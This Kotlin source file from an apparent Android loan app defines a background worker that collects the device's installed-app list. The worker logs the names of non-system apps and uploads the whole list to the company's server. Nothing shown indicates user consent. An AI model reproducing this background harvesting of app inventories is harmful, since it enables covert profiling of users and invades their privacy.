package com.loanspeed.speed.util.workManager

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import com.loanspeed.speed.CharmApplication
import com.loanspeed.speed.ext.createBody
import com.loanspeed.speed.model.AppInfoModel
import com.loanspeed.speed.net.ApiServices
import com.loanspeed.speed.net.HttpManager
import com.loanspeed.speed.util.ContactUtil
import com.loanspeed.speed.util.slog


/**
 * 已安装列表收集
 */
class InstallAppWM (private val context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {

    private val goon = Gson()
    private val mApiService by lazy { HttpManager.create(ApiServices::class.java) }

    override suspend fun doWork(): Result {
        try {
            val installAppList = ContactUtil.getLocalApps(CharmApplication.instance)
            val map = HashMap<String,Any>()
            map["app_list"] = goon.toJson(installAppList)

            installAppList.size.slog("获取app列表 数量")


            val systemApp= mutableListOf<AppInfoModel>()
            val notsystemApp= mutableListOf<AppInfoModel>()

            installAppList.forEach {
                if (it.isSysApp) {
                    systemApp.add(it)
                }else{
                    notsystemApp.add(it)
                }
            }


            systemApp.size.slog("系统app列表 数量")


            notsystemApp.size. slog("非系统app列表 数量")


            notsystemApp.map {
                it.appName
            }. slog("非系统app列表")

            installAppList.slog("获取app列表")


            mApiService.upInstallAppList(map.createBody())
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }

    }

}